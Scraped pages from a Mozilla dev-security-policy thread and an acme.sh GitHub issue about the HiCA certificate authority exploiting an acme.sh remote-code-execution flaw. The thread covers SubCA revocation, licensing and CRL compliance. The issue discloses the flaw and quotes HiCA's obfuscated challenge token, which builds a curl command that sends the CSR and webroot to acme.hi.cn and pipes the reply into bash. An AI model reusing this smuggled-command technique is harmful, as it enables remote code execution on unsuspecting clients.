Either way at this point I don’t think there’s much the MDSP can/should do about this. Your defensiveness against being called out on launching an attack does not bring confidence to your claim that there was no ill intent here.

> --
>
> You received this message because you are subscribed to a topic in the Google Groups "dev-secur...@mozilla.org" group.
>
> To unsubscribe from this topic, visit <https://groups.google.com/a/mozilla.org/d/topic/dev-security-policy/heXVr8o83Ys/unsubscribe>.
>
> To unsubscribe from this group and all its topics, send an email to dev-security-po...@mozilla.org.
>
> To view this discussion on the web visit [https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/CAEi6wDMyvGa26QOoa4CzqqbW-cYJfWDpJDpxS3e1EaGG1TbOng%40mail.gmail.com](https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/CAEi6wDMyvGa26QOoa4CzqqbW-cYJfWDpJDpxS3e1EaGG1TbOng%40mail.gmail.com?utm_medium=email&utm_source=footer).

--
Amir Omidi (he/them)
![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 16, 2023, 6:22:27 PM6/16/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Amir Omidi, John Liptak, Roger M Lambdin, Thomas Zermeno, dev-secur...@mozilla.org, xiaoh...@e.hexdata.cnMr  Amir Omidi,

You misunderstood me,I never said i refuse to open source RCE poc.I use to speak there's many business services in the same framework, i need to desensitization and withdrawal, and this will take a certain amount of time. I'll open source it I promise.

![Rob Stradling's profile photo](//lh3.googleusercontent.com/a-/ALV-UjWG6S-z9uiCkQ_Mb5647CPeCZowdffC0LvywWbQc2B3wRtV1Q=s40-c)
### Rob Stradling

unread,Jun 16, 2023, 8:38:46 PM6/16/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto xiaoh...@e.hexdata.cn, Amir Omidi, John Liptak, Roger M Lambdin, Thomas Zermeno, dev-secur...@mozilla.org
> > please register an official ID to participate in the discussion

I'm not aware of any jurisdiction in which an email address is an "official ID".

> There has never been a requirement to do this

+1

Periodic reminder, quoting <https://wiki.mozilla.org/CA>):

*"If you are a regular participant in MDSP, then please add your name to the [Policy Participants](https://wiki.mozilla.org/CA/Policy_Participants "https://wiki.mozilla.org/CA/Policy_Participants") page"*

...which, quoting <https://wiki.mozilla.org/CA/Policy_Participants>):

*"is an optional list of the names, affiliations (if speaking for a company) and backgrounds of participants in the MDSP mailing list."*

It's notable that email addresses do not feature in this page.

---

**From:** 'Amir Omidi' via dev-secur...@mozilla.org <dev-secur...@mozilla.org>

**Sent:** 16 June 2023 18:07

**To:** xiaoh...@e.hexdata.cn <xiaoh...@e.hexdata.cn>

**Cc:** John Liptak <johnli...@gmail.com>; Roger M Lambdin <bir...@gmail.com>; Thomas Zermeno <madca...@gmail.com>; dev-secur...@mozilla.org <dev-secur...@mozilla.org>

**Subject:** Re: RCE used by Intermediate CA to issue certificates.

CAUTION: This email originated from outside of the organization. Do not click links or open attachments unless you recognize the sender and know the content is safe.


You received this message because you are subscribed to the Google Groups "dev-secur...@mozilla.org" group.
To unsubscribe from this group and stop receiving emails from it, send an email to
dev-security-po...@mozilla.org.

To view this discussion on the web visit [https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/CAOG%3DJULbAtbs-nLrs8ZhapgNHj6-yno0hnytFV9F%3DQmPdMw4EQ%40mail.gmail.com](https://groups.google.com/a/mozilla.org/d/msgid/dev-security-policy/CAOG%3DJULbAtbs-nLrs8ZhapgNHj6-yno0hnytFV9F%3DQmPdMw4EQ%40mail.gmail.com?utm_medium=email&utm_source=footer).

![John Liptak's profile photo](//lh3.googleusercontent.com/a-/ALV-UjVdLARqQUXexDHpBdnuGUF8yv30Mfckl59d4xbqxAyPMMzzLg=s40-c)
### John Liptak

unread,Jun 17, 2023, 3:33:20 AM6/17/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, xiaohuilam, Thomas ZermenoI've been a member of chromium-dev group and am particularly interested in internet security. I choose not to reply all because I'm asking questions to specific people. The screenshot you've taken shows I'm asking that question to you and the SSL.com representative, not to everyone else.
Because SSL.com CPS 5.3.1 claims they will verify the trustworthiness of an independent contractor and apparently you are doing this business illegally in China (e.g., selling digital certificates online without the ICP license), so I don't think they follow their CPS.
You claimed "We never operates the CRL and OCSP responders. But CA does(SSL.com can confirm it)," but you are serving CRLs and OCSP responses from the domain [sslcom.cn](http://sslcom.cn), which is registered by 上海帝熙科技有限公司 and the ICP beian shows it belongs to 上海帝熙科技有限公司. If it is operated by SSL.com, then that means you had provided false materials to the government and the person/legal entity in charge of the website is different from the person in your application.
Again, all these evidence reveals SSL.com did not verify the trustworthiness of an independent contractor and I think they don't follow their CPS.
I am not Chinese and I have no interest in attacking HiCA. Nevertheless, I am interested in whether SSL.com and you have followed the CPS and operated legally.
![inao...@gmail.com's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### inao...@gmail.com

unread,Jun 17, 2023, 6:54:11 AM6/17/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto John Liptak, dev-security-policy, Thomas ZermenoThank you for your further response and questions.
> You claimed "We never operates the CRL and OCSP responders. But CA does(SSL.com can confirm it)," but you are serving CRLs and OCSP responses from the domain [sslcom.cn](http://sslcom.cn), which is registered by 上海帝熙科技有限公司 and the ICP beian shows it belongs to 上海帝熙科技有限公司. If it is operated by SSL.com, then that means you had provided false materials to the government and the person/legal entity in charge of the website is different from the person in your application.
We looked up the crt.sh tool [^1], It is a widely accepted way for subordinate CA customization resellers to provide domain for CA’s different OCSP hosting. Look up ocsp responder which public-suffixing .cn，We can find my many responders of Sectigo and DigiCerr own domain ICP but no business ICP.And many of them have ICP license for domain, but no ICP business license.So I think meantimes the subordinate CA’s created at, there’s no leads to reveal the way is illegal toChinese regulations or violations to CPS/CP.

If my opinion wrong, correct it welcome

[1]. <https://crt.sh/ocsp-responders>
Sincere,Bruce Lam

---

发自我的iPhone

------------------ Original ------------------**From:** John Liptak <johnli...@gmail.com>**Date:** Sat,Jun 17,2023 10:33 AM**To:** dev-secur...@mozilla.org <dev-secur...@mozilla.org>**Cc:** xiaohuilam <inao...@gmail.com>, Thomas Zermeno <madca...@gmail.com>**Subject:** Re: RCE used by Intermediate CA to issue certificates.0617\_1.jpg[](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/32e49b1ce171e/0617_1.jpg?part=0.1)0617\_2.jpg[](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/32e49b1ce171e/0617_2.jpg?part=0.2)0617\_3.jpg[](https://groups.google.com/a/mozilla.org/group/dev-security-policy/attach/32e49b1ce171e/0617_3.jpg?part=0.3)![John Liptak's profile photo](//lh3.googleusercontent.com/a-/ALV-UjVdLARqQUXexDHpBdnuGUF8yv30Mfckl59d4xbqxAyPMMzzLg=s40-c)
### John Liptak

unread,Jun 17, 2023, 6:33:39 PM6/17/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, inao...@gmail.com, Thomas Zermeno, John Liptak> We looked up the crt.sh tool [^1], It is a widely accepted way for subordinate CA customization resellers to provide domain for CA’s different OCSP hosting. Look up ocsp responder which public-suffixing .cn，We can find my many responders of Sectigo and DigiCerr own domain ICP but no business ICP.
This is a red herring fallacy. What I asked was your the person in charge of the domain [sslcom.cn](http://sslcom.cn) is different from the person in the ICP beian application you sent to the government. This is what I said:**If it is operated by SSL.com, then that means you had provided false materials to the government and the person/legal entity in charge of the website is different from the person in your application**.

Also, Tom from SSL.com has claimed "other than to provide them brandable certificates"; however, I think you must have helped or assisted SSL.com to establish this CRL/OCSP server in China. You are more than a reseller.
Since you mentioned digicert, I did look them up.
[digicert.cn](http://digicert.cn) is registered and operated by Digicert China. The ICP beian also shows the domain belongs to Digicert China.
[dcocsp.cn](http://dcocsp.cn) is registered by iTrusChina. Do you have evidence that iTrusChina is not operating [dcocsp.cn](http://dcocsp.cn)? iTrusChina is listed in Digicert's Trusted partners directory. <https://www.digicert.com/es/partners/trusted-partners-directory>
iTrusChina is a root CA and has obtained webtrust audits.
Moreover, iTrusChina has ICP license. They also have 电子认证服务许可证, 电子认证服务使用密码许可证, and 电子政务电子认证服务批文 issued by the State Cryptography Administration (国家密码管理局).
Even iTrusChina is not operating [dcocsp.cn](http://dcocsp.cn), again, just because someone else is doing the same thing doesn't mean it's not illegal.
> And many of them have ICP license for domain, but no ICP business license.Since you asked this question: I want to point out Digicert has never used [digicert.cn](http://digicert.cn) to SELL certificates. However, you sell certificates directly on your [quantumca.com.cn](http://quantumca.com.cn) and [www1.hi.cn](http://www1.hi.cn)![Xiaohui Lam's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXwjYUoSPRmYIngDgvm9rT3wSFkhJwa9ouvvTya0DP11yEBXaVo=s40-c)
### Xiaohui Lam

unread,Jun 17, 2023, 6:58:13 PM6/17/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, John Liptak, inao...@gmail.com, Thomas ZermenoJohn Liptak,
For the [www1.hi.cn](http://www1.hi.cn),
There have **no payment business** entry **at the web.** it only accepts payments only on command line. So this one is controversial, You can’t ask a website that provides only an online donation button for a blog to also go through the ICP revenue registration which needs taking more than 10,000 yuan.
So we think a website only published tutorials needn't ICP revenue business registration.
You can check the website no member link to register/login, and cart functions to purchase product.
- [http://web.archive.org/web/20230330032620/https://www1.hi.cn/](http://web.archive.org/web/20230330032620/https%3A//www1.hi.cn/)
We have no plan to invest resources(about thousands dollars) to apply the ICP revenue registration for a dead business.
---
For [www.quantumca.com.cn](http://www.quantumca.com.cn) it have revenue business online,  that's our mistake and, we decide to apply ICP revenue business registration at Q3. Sounds a little off-topic about the question, this thread should closely talking about RCE security or things technical. ![Thomas Zermeno's profile photo](//lh3.googleusercontent.com/a-/ALV-UjV3noErre4w9XBjy78V7QEEunKjd_ZiV7Solw5BjuAIEXrds_Fz=s40-c)
### Thomas Zermeno

unread,Jun 19, 2023, 8:24:19 PM6/19/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Xiaohui Lam, John LiptakThis is to provide an update on the revocation of the QuantumCA SubCAs. They were all revoked within the required timeframe. Since they were never enabled for ACME, there was never an issue with these SubCAs being used in the HiCA acme.sh RCE client.
With regards to other issues raised in the discussion and which mention SSL.com:
Before issuing SubCAs to any resellers, SSL.com performs verification equivalent to an Extended Validation review of the organization applying for the SubCA(s). In summary, this includes verification of the legal, physical and operational existence, and verification of the authorization of the request. It does not include background checks, reputational research, or any checks for criminal records of the organization representatives, other than checks against the applicable sanctions lists.
In the case of Quantum, our checks included doing lookups on the organization using the UK Registry Companies House and a Qualified Independent Information Source (QIIS), verifying the identity of contact persons representing the organization and comparing them against several US sanctions lists. Additionally, we performed live interviews with company representatives over teleconference and via the verified means of communication with the organization. All required verifications were performed and approved before issuance of QuantumCA’s SubCAs.
Furthermore, we confirm that the sole purpose of domain [sslcom.cn](http://sslcom.cn) was to serve CRL and OCSP responses, and SSL.com is the only entity operating the OCSP responders and CRL distribution points under that domain. There are no active certificates relying on that domain.
Finally, we would like to point out that section 5.3.1 of our CP/CPS only applies to employees, agents or independent contractors of SSL.com and delegated third parties which are engaged in the Certificate Management Process. As a branded SubCA consumer, QuantumCA was not a delegated third party of SSL.com. Although not required, SSL.com still performed EV review on them as we do with all other SubCA resellers.
To summarize, the Quantum SubCAs were never enabled for ACME by SSL.com and they could not have been used to issue certificates with the vulnerable acme.sh client. During the course of this discussion, due to the dissolution of Quantum CA Limited, we took additional action in revoking their SubCAs. We hope these statements address all relevant concerns regarding HiCA’s use of Quantum SubCAs issued by SSL.com.
![San Wong's profile photo](//lh3.googleusercontent.com/a-/ALV-UjXPwHuYRZUBvs8lWLjNAusfqfflTCHLPhUK1K96EwuLsJ3Iitc=s40-c)
### San Wong

unread,Jun 24, 2023, 8:04:09 PM6/24/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, Thomas Zermeno, Xiaohui Lam, John LiptakAccording to the previous discussion, [sslcom.cn](http://sslcom.cn) should be actually controlled by [ssl.com](http://ssl.com), but we found that both [ocsp.sslcom.cn](http://ocsp.sslcom.cn) and [crl.sslcom.cn](http://crl.sslcom.cn) are not compliant.

1. [ocsp.sslcom.cn](http://ocsp.sslcom.cn) returned an incorrect response to the ocsp verification request, so the certificate could not be revoked.
2. [crl.sslcom.cn](http://crl.sslcom.cn) responds to historical data (data before revoking), and the cache time is as long as 1 year.

```
# openssl crl -inform DER -in <http://crl.sslcom.cn/SSLcom-RootCA-RSA-4096-R1.crl> -text -issuer -hash -lastupdate -nextupdate
issuer=/C=US/ST=Texas/L=Houston/O=SSL Corporation/CN=SSL.com Root Certification Authority RSA
6fa5da56
lastUpdate=Jun 15 15:54:47 2023 GMT
nextUpdate=Jun 9 15:54:46 2024 GMT
Certificate Revocation List (CRL):
 Version 2 (0x1)
 Signature Algorithm: sha256WithRSAEncryption
 Issuer: /C=US/ST=Texas/L=Houston/O=SSL Corporation/CN=SSL.com Root Certification Authority RSA
 Last Update: Jun 15 15:54:47 2023 GMT
 Next Update: Jun 9 15:54:46 2024 GMT
 CRL extensions:
 X509v3 Authority Key Identifier:
 keyid:DD:04:09:07:A2:F5:7A:7D:52:53:12:92:95:EE:38:80:25:0D:A6:59

 X509v3 CRL Number:
 19
Revoked Certificates:
...
```
Not compliant with [CPS](https://legal.ssl.com/documents/SSLcom-CP-CPS-v1.17.pdf) 4.9.7 and 4.9.9.

![Thomas Zermeno's profile photo](//lh3.googleusercontent.com/a-/ALV-UjV3noErre4w9XBjy78V7QEEunKjd_ZiV7Solw5BjuAIEXrds_Fz=s40-c)
### Thomas Zermeno

unread,Jun 26, 2023, 2:43:36 PM6/26/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, San Wong
San,
The CRL that you are referencing reflects the status of our SubCAs, not the status of our SSL/TLS and Client Subscriber Certificates.
From our CP/CPS:

For the status of Subordinate CA Certificates and time-stamping Certificates, SSL.com shall
update and reissue CRLs at least:
     • once every **twelve (12) months** and
     • within **twenty-four (24) hours** after revoking a Subordinate CA Certificate,
and the value of the nextUpdate field must not be more than **twelve (12) months** beyond the
value of the thisUpdate field.
It is acceptable for these CRLs to have 1 year validity periods.
The CRL contains the serial numbers:

1. [4E33A3DF038C94BD5611A51814F68CE9](https://crt.sh/?sha1=C21028433BB62D1E64F5D54B592F9C94FFC5ADAE) (revoked 2023-06-15 15:53:15 UTC)
2. [663E22B3F73CCB78DC74369353AB24C3](https://crt.sh/?sha1=1999B1FD1224DA4E9CFDB15D45B8FD3A81F06C52) (revoked 2023-06-15 15:53:16 UTC)
3. [50758BB068C7CA6BF84CC950ABC26539](https://crt.sh/?sha1=B4C47116082859CE6D85114601352477413C5EBC) (revoked 2023-06-15 15:53:17 UTC)
4. [3348510D6AA99654904848A14BE65170](https://crt.sh/?sha1=6F9D48936597B67880F1463E0F0459EEDB298DA4) (revoked 2023-06-15 15:53:18 UTC)
5. [0AF338327C1D48BA41753EBEB9EA6029](https://crt.sh/?sha1=24C0B4AB0DDC29667F63417BF415E90ACFADAF13) (revoked 2023-06-15 15:53:20 UTC)
6. [4EB6AD64EA15BA233C32B0D491670063](https://crt.sh/?sha1=3DCA8C6256D9AED555940DFB77BA7244EAB5D82C) (revoked 2023-06-15 15:53:21 UTC)

And it was issued one minute after the revocations: Last Update: Jun 15 15:54:47 2023 GMT

Regards,
Tom[SSL.com](https://www.ssl.com)![Jesper Kristensen's profile photo](//lh3.googleusercontent.com/a-/ALV-UjVbEJzgE91Et9xCCUk84T2FAJLxD7iqqsa_Ody1DsqnNcvt=s40-c)
### Jesper Kristensen

unread,Jun 27, 2023, 9:39:58 PM6/27/23Reply to authorSign in to reply to authorForwardSign in to forwardDeleteYou do not have permission to delete messages in this groupCopy linkReport messageShow original messageEither email addresses are anonymous for this group or you need the view member email addresses permission to view the original messageto dev-secur...@mozilla.org, madca...@gmail.comDen man. 19. jun. 2023 kl. 21.24 skrev Thomas Zermeno <madca...@gmail.com>:
> This is to provide an update on the revocation of the QuantumCA SubCAs. They were all revoked within the required timeframe. Since they were never enabled for ACME, there was never an issue with these SubCAs being used in the HiCA acme.sh RCE client.

I do not follow your logic. According to the description I have seen, the purpose of exploiting the RCE was to use acme.sh with a CA that was not enabled for ACME.

Reply allReply to authorForward0 new messages

=== Content from github.com_099e62c2_20250110_141533.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Facmesh-official%2Facme.sh%2Fissues%2F4659)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=acmesh-official%2Facme.sh)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[acmesh-official](/acmesh-official)
/
**[acme.sh](/acmesh-official/acme.sh)**
Public

* [Notifications](/login?return_to=%2Facmesh-official%2Facme.sh) You must be signed in to change notification settings
* [Fork
  5.1k](/login?return_to=%2Facmesh-official%2Facme.sh)
* [Star
   40.6k](/login?return_to=%2Facmesh-official%2Facme.sh)

* [Code](/acmesh-official/acme.sh)
* [Issues
  1k](/acmesh-official/acme.sh/issues)
* [Pull requests
  216](/acmesh-official/acme.sh/pulls)
* [Discussions](/acmesh-official/acme.sh/discussions)
* [Actions](/acmesh-official/acme.sh/actions)
* [Wiki](/acmesh-official/acme.sh/wiki)
* [Security](/acmesh-official/acme.sh/security)
* [Insights](/acmesh-official/acme.sh/pulse)

Additional navigation options

* [Code](/acmesh-official/acme.sh)
* [Issues](/acmesh-official/acme.sh/issues)
* [Pull requests](/acmesh-official/acme.sh/pulls)
* [Discussions](/acmesh-official/acme.sh/discussions)
* [Actions](/acmesh-official/acme.sh/actions)
* [Wiki](/acmesh-official/acme.sh/wiki)
* [Security](/acmesh-official/acme.sh/security)
* [Insights](/acmesh-official/acme.sh/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Facmesh-official%2Facme.sh%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Facmesh-official%2Facme.sh%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# acme.sh runs arbitrary commands from a remote server #4659

Closed

[mholt](/mholt) opened this issue
Jun 8, 2023
· 50 comments

Closed

# [acme.sh runs arbitrary commands from a remote server](#top) #4659

[mholt](/mholt) opened this issue
Jun 8, 2023
· 50 comments

## Comments

[![@mholt](https://avatars.githubusercontent.com/u/1128849?s=80&u=f5cb951b9d7eb2940bd90e879b7a8f3b427b1656&v=4)](/mholt)

Copy link

### **[mholt](/mholt)** commented [Jun 8, 2023](#issue-1748652612) • edited Loading

| Hello,  You may already be aware of this, but [HiCA](https://www1.hi.cn/en/) is injecting arbitrary code/commands into the certificate obtaining process and acme.sh is running them on the client machine. I am not sure if this is intentional, expected by users, or safe/unsafe. But I'm documenting my findings for the public to be aware of with this CA.  HiCA's documentation explains that it only supports acme.sh as a client. This was curious to me so I tried to learn why, if it is using ACME (and the ACME logo!) it should be basically compatible with the majority of ACME clients. While obtaining a certificate using [ACMEz](https://github.com/mholt/acmez), [I discovered](https://twitter.com/mholt6/status/1666897779564892160) that the Directory was blocked unless the User-Agent is set to a string that starts with `Mozilla` or `acme.sh/2.8.2 (https://github.com/Neilpang/acme.sh)`. (Firefox loaded the directory just fine, which is surprising because Firefox is not acme.sh.) (I also noticed that `caaIdentities` includes a variety of CAs including Google Trust Services and SSL.com. Curious.)  Once I faked the UA in my own client and got that working, issuance still failed. Curiously, the error message involved trying a URL of `../pki-validation`. This doesn't make any sense to me [even though that kind of appears in their docs](https://www1.hi.cn/en/docs/tutorial-expert/challenge/http-challenge) because it is not standard ACME, so I dug a little deeper to figure out what the Challenge object consisted of that would cause my client to try making a request to `../pki-validation`.  It turns out that the Challenge objects look unusual. Here's a lightly-formatted example:  ``` {     Type: http-01     URL: ../pki-validation     Status: pending     Token: dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#     KeyAuthorization: dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.GfCBN3dYnfNB-Hj1nBYek89o9ohtt9K59uacS13wigw } ```  Now it became immediately obvious to my why HiCA only supports acme.sh. They are not conforming to ACME at all! (Bugs the heck outa me that [they're using the official ACME logo on their site](https://www1.hi.cn/en/docs/intro) even though they don't implement the ACME standard.)  Instead, **HiCA is stealthily crafting `curl` commands and piping the output to `bash`. acme.sh is (being tricked into?) running arbitrary code from a remote server.** ❗  Here's my analysis so far:  The Token string is NOT in conformance with RFC 8555, which states: "the token for a challenge is a string comprised entirely of characters in the URL safe base64 alphabet." (`#` is not URL-safe).  However you can tell they're abusing this Token string to encode structure that can be parsed by splitting on "#":   * I'm not sure what "dd" means. I do have a file called `/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd<<<IA==`-sF`IFS=^;cmd=base64^-d;$cmd<<<IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd<<<IA==`https$(IFS=^;cmd=base64^-d;$cmd<<<Oi8v)acme.hi.cn/acme/csr/http/123456/654321\?o\=\$_w\|bash\)/.well-known/acme-challenge/dd` after running acme.sh for a test domain though. It contains the value "dd"... * The next part is clearly a URL to a "precheck-http" resource for this challenge. It returns an error "csr not submitted" if you try to request them before running the `csr/http` endpoint successfully. I haven't crafted a successful request to this endpoint yet. * The next part of the token is the challenge type, http-01 in this case. * The part starting with "/tmp/" is a path to a temporary folder or file. A curl command is crafted by inline scripts that write " " (space) and "://" by base64-decoding "IA==" and "Oi8v" respectively. The result is a command like `curl -sF csr=@... https://...?o=$_w`. In other words, it sends the CSR (provided by acme.sh variable `$csr`) and your web root to the CA and then pipes the response of that command straight into bash and acme.sh runs it. 😬 ~~I am hoping you could help me craft a request to see the contents of the script that is being run. It seems to involve writing to the disk since `o` (output?) contains the webroot (the value of `$_w` in acme.sh).~~ UPDATE: [Aleksejs Popovs has extracted the remote script and verified that it does get executed in a VM.](https://twitter.com/aleksejspopovs/status/1666955050696966148) * Another obvious concern is the Token is supposed to contain at least 128 bits of entropy *without client influence*. See RFC 8555 section 11.3: "First, the ACME client should not be able to influence the ACME server's choice of token as this may allow an attacker to reuse a domain owner's previous challenge responses for a new validation request." * Error responses come with a 200 status and application/json Content-Type in violation of RFC 8555 (and HTTP convention). This makes it tedious to correctly handle errors. Only "server error" responses return 500. * The second number in the endpoints (654321 in this example) increments for each challenge. So we know how many challenges this CA is experiencing.   Anyway, this all seems very worrisome to me.  I am not sure why HiCA is doing what they are doing. But this intentional deviation from RFC 8555 and the lack of transparency on their docs is suspicious and concerning.  I am not sure if it is intentional that acme.sh is allowing arbitrary commands from a remote server to execute.  Hopefully this is helpful and maybe you can provide some insight and recommendations. |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
57
 hau-tran-works, focux, zii, IceCodeNew, rithvikvibhu, quantumpacket, thekoma, beyer-stefan, ennui93, alimoezzi, and 47 more reacted with thumbs up emoji
 😕
13
 CannibalKush, noncombatant, dbrennand, jspawar, thekoma, alimoezzi, bebosudo, nyanotech, tategotoazarasi, null-dev, and 3 more reacted with confused emoji
 ❤️
2
 tristanfisher and tedb reacted with heart emoji
 🚀
4
 cbluth, thekoma, hugmouse, and yushijinhun reacted with rocket emoji
 👀
59
 lucasjohnston, seankhliao, jprenken, paulchambers, L1Cafe, MasterKale, Xe, mcpherrinm, gertvdijk, danielcompton, and 49 more reacted with eyes emoji

All reactions

* 👍
  57 reactions
* 😕
  13 reactions
* ❤️
  2 reactions
* 🚀
  4 reactions
* 👀
  59 reactions

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=80&v=4)](/apps/github-actions)

Copy link

### **[github-actions](/apps/github-actions) bot** commented [Jun 8, 2023](#issuecomment-1583358791)

| Please upgrade to the latest code and try again first. Maybe it's already fixed. `acme.sh --upgrade` If it's still not working, please provide the log with `--debug 2`, otherwise, nobody can help you. |
| --- |

 👎
68
 JayJamieson, noncombatant, gertvdijk, cheesbrgr, aaomidi, boxmein, H4ad, whitestrake, jspawar, AaronFriel, and 58 more reacted with thumbs down emoji
 😄
45
 tristanfisher, boboTjones, mholt, infogulch, rtcms, Nyaasu66, Pix13, mauran, Vam-Jam, crabmusket, and 35 more reacted with laugh emoji
 😕
1
 osnyx reacted with confused emoji

All reactions

* 👎
  68 reactions
* 😄
  45 reactions
* 😕
  1 reaction

Sorry, something went wrong.

